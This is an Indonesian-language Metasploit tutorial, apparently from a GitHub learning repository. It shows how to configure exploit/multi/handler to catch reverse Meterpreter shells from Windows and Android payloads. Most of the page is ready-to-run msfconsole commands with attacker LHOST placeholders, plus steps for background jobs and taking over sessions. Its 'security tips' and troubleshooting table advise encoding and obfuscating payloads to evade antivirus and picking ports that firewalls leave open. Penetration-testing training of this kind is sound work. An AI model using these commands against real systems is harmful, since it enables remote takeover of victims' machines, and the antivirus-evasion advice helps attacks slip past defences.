<p align="left">
  <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Memahami%20Payload%2C%20Encoder%2C%20dan%20NOPs.md">Memahami Payload, Encoder, dan NOPs</a>
</p>

# Membuat Listener

## A. Apa itu Listener

`Listener` adalah komponen di Metasploit yang berfungsi untuk menerima koneksi balik (reverse connection) dari payload yang sudah ditanamkan ke target. Di Metasploit terdapat modul listener yaitu:

```
exploit/multi/handler
```

Modul ini tidak mengeksploitasi, tapi hanya mendengarkan dan menangani koneksi masuk dari payload yang berhasil dijalankan di sistem korban.

## B. Langkah-Langkah Membuat Listener

1. Jalankan Metasploit Framework:

   ```
   msfconsole
   ```

2. Pilih Modul multi/handler:

   ```
   use exploit/multi/handler
   ```

3. Tentukan Payload yang Sesuai

   Contoh jika payload yang dikirim adalah `windows/meterpreter/reverse_tcp`:

   ```
   set PAYLOAD windows/meterpreter/reverse_tcp

   ```

4. Atur IP dan Port Listener:

   ```
   set LHOST 192.168.1.100
   set LPORT 4444
   ```

   Keterangan:
   - **LHOST**: IP Attacker (listener)
   - **LPORT**: Port tempat menerima koneksi

5. Jalankan Listener:

   ```
   run
   ```

   Atau bisa juga:

   ```
   exploit
   ```

## C. Contoh Lengkap: Listener untuk Payload Windows:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP_ATTACKER>
set LPORT 4444
exploit
```

## D. Contoh Listener untuk Payload Android:

```
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST <IP_ATTACKER>
set LPORT 4444
exploit
```

## E. Mode Background Listener

Kalau ingin listener tetap berjalan di background:

```
exploit -j -z
```

Keterangan:
- `-j`: Jalankan sebagai job (background)
- `-z`: Tidak membuka sesi interaktif secara langsung

Melihat job listener aktif:

```
jobs
```

Menghentikan job tertentu:

```
jobs -k <ID>
```

Menghentikan semua job:

```
jobs -K
```


## F. Interaksi dengan Session Meterpreter

Saat target berhasil terhubung, session akan muncul:

```
sessions
```

Untuk masuk ke sesi:

```
sessions -i <ID>
```

## G. Tips Keamanan

- Gunakan IP yang benar-benar bisa diakses korban (`public IP/VPN/local` sesuai skenario).
- Jangan gunakan port yang umum terblokir firewall.
- Gunakan encoding dan obfuscation pada payload untuk menghindari AV.

## H. Troubleshooting

| Masalah | Penyebab Umum | Solusi |
|:--:|:--:|:--:|
| Tidak ada koneksi masuk | `IP/Port` salah | Pastikan `LHOST/LPORT` sesuai|
| Payload terdeteksi AV | Payload tidak diencode | Gunakan `-e` encoder di `msfvenom` |
| Listener tidak merespons | Port diblokir | Ganti port atau periksa firewall |

<p align="right">
  <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Bypass%20Antivirus%20(AV)%20dengan%20Metasploit%20Framework.md">Bypass Antivirus (AV) dengan Metasploit Framework</a>
</p>
